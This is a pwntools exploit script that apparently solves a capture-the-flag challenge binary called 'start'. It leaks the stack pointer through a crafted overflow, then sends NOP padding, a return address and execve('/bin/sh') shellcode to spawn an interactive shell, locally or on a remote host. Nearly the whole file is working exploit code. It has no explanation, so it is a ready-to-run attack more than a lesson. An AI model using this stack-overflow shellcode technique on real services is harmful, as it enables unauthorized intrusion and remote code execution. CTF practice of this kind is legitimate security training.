from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './start'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
def leak_esp(r):
    address_1 = p32(0x08048087)           
    payload = flat('A'*20 , address_1)
    print(r.recvuntil('CTF:'))
    r.send(payload)
    esp = u32(r.recv()[:4])
    print("Address of ESP: ", hex(esp))
    return esp

io = start()

padding = 20
esp = leak_esp(io)
shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

payload = flat(
    b'\x90' * padding,
    esp+20,
    shellcode
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendline( payload)

# Receive the flag
io.interactive()